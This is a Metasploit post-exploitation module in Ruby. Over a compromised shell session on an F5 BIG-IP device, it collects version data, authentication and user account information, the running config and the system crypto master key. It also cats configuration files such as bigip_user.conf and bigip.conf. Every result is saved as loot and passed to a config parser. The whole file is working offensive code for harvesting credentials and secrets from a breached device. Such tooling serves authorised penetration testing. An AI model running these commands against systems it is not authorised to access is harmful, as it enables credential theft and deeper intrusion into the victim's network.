##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Auxiliary::F5

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'F5 Gather Device General Information',
        'Description' => %q{
          This module collects a F5's device information and configuration.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'h00die'],
        'SessionTypes' => [ 'shell' ]
      )
    )
  end

  def run
    # Get device prompt
    prompt = session.shell_command('?')
    started_tmos = false
    unless prompt.include? 'Commands:'
      started_tmos = true
      print_status('Moving to TMOS prompt')
      session.shell_command('tmsh')
    end
    prompt = session.shell_command('')

    # Get version info
    system_out = session.shell_command('show /sys version')
    # https://support.f5.com/csp/article/K8759
    ver_loc = store_loot('f5.version',
                         'text/plain',
                         session,
                         system_out.strip,
                         'config.txt',
                         'F5 Version')
    vprint_good("Config information stored in to loot #{ver_loc}")
    if /^Main Package(?<content>.+)\n\n/m =~ system_out # just capture the content to parse
      ver = []
      if /^\s+Product\s+(?<product>[\w-]+)$/ =~ content
        ver << product
      end
      if /^\s+Version\s+(?<version>[\d.]+)$/ =~ content
        ver << version
      end
      if /^\s+Build\s+(?<build>[\d.]+)$/ =~ content
        ver << build
      end
      print_good("Version: #{ver.join(' ')}") unless ver.empty?
    else
      print_bad('Unable to obtain system version information')
    end
    # run additional information gathering

    enum_tmos_configs(prompt)
    if started_tmos
      session.shell_command('quit') # exit tmos
    else
      session.shell_command('bash') # go to bash from tmos
    end
    enum_configs(prompt)
  end

  def enum_tmos_configs(prompt)
    host = session.session_host
    port = session.session_port
    exec_commands = [
      {
        'cmd' => 'show sys',
        'fn' => 'show_sys',
        'desc' => 'Get Device System Information on F5 Device'
      },
      {
        'cmd' => 'show auth',
        'fn' => 'show_auth',
        'desc' => 'Get User Account and Authentication Information on F5 Device'
      },
      {
        'cmd' => 'show cm',
        'fn' => 'show_cm',
        'desc' => 'Get Configuration Management Information on F5 Device'
      },
      {
        'cmd' => 'show net',
        'fn' => 'show_net',
        'desc' => 'Get Network Information on F5 Device'
      },
      {
        'cmd' => 'show running-config',
        'fn' => 'show_running_config',
        'desc' => 'Get Running Config on F5 Device'
      },
      {
        'cmd' => 'show sys crypto master-key',
        'fn' => 'show_crypto_key',
        'desc' => 'Get Crypto Master Key on F5 Device'
      },
    ]
    exec_commands.each do |ec|
      command = ec['cmd']
      cmd_out = session.shell_command(command).gsub(/#{command}|#{prompt}/, '')
      if cmd_out.include?('Display all')
        cmd_out += session.shell_command('y')
      end
      if cmd_out.include?('---(less')
        cmd_out += session.shell_command(" \n" * 20) # 20 pages should be enough
      end

      # loop to ensure we get all content within the 5 sec window
      # rubocop:disable Lint/AssignmentInCondition
      loop do
        break unless out_tmp = session.shell_read

        cmd_out << out_tmp
      end
      # rubocop:enable Lint/AssignmentInCondition

      print_status("Gathering info from #{command}")
      cmd_loc = store_loot("F5.#{ec['fn']}",
                           'text/plain',
                           session,
                           cmd_out.strip,
                           "#{ec['fn']}.txt",
                           ec['desc'])
      vprint_good("Saving to #{cmd_loc}")
      f5_config_eater(host, port, cmd_out.strip, false)
    end
  end

  def enum_configs(prompt)
    host = session.session_host
    port = session.session_port
    # https://support.f5.com/csp/article/K26582310
    exec_commands = [
      {
        # High-level traffic management and system configuration, such as virtual servers,
        # profiles, access policies, iRules, and authentication settings
        'cmd' => 'cat /config/bigip.conf',
        'fn' => 'bigip.conf',
        'desc' => 'Get Config on F5 Device'
      },
      {
        # Base-level network and system configuration, such as VLANs, self IPs,
        # device service clustering (DSC), and provisioning
        'cmd' => 'cat /config/bigip_base.conf',
        'fn' => 'bigip_base.conf',
        'desc' => 'Get Base Config on F5 Device'
      },
      {
        # BIG-IP GTM/DNS-specific configuration such as Wide IPs, pools, data centers,
        # and servers
        'cmd' => 'cat /config/bigip_gtm.conf',
        'fn' => 'bigip_gtm.conf',
        'desc' => 'Get GTM Config on F5 Device'
      },
      {
        # Custom iApps templates
        'cmd' => 'cat /config/bigip_script.conf',
        'fn' => 'bigip_script.conf',
        'desc' => 'Get iApps templates on F5 Device'
      },
      {
        # User account configuration
        'cmd' => 'cat /config/bigip_user.conf',
        'fn' => 'bigip_user.conf',
        'desc' => 'Get User Config on F5 Device'
      },
      {
        # Custom BIG-IP system alerts
        'cmd' => 'cat /config/user_alert.conf',
        'fn' => 'user_alert.conf',
        'desc' => 'Get System Alerts on F5 Device'
      },
    ]
    exec_commands.each do |ec|
      command = ec['cmd']
      cmd_out = session.shell_command(command).gsub(/#{command}|#{prompt}/, '')
      print_status("Gathering info from #{command}")
      if cmd_out.include?('No such file or directory') || cmd_out.strip == ''
        print_error('File not found or empty')
        next
      end
      cmd_loc = store_loot("F5.#{ec['fn']}",
                           'text/plain',
                           session,
                           cmd_out.strip,
                           "#{ec['fn']}.txt",
                           ec['desc'])
      vprint_good("Saving to #{cmd_loc}")
      f5_config_eater(host, port, cmd_out.strip, false)
    end
  end
end
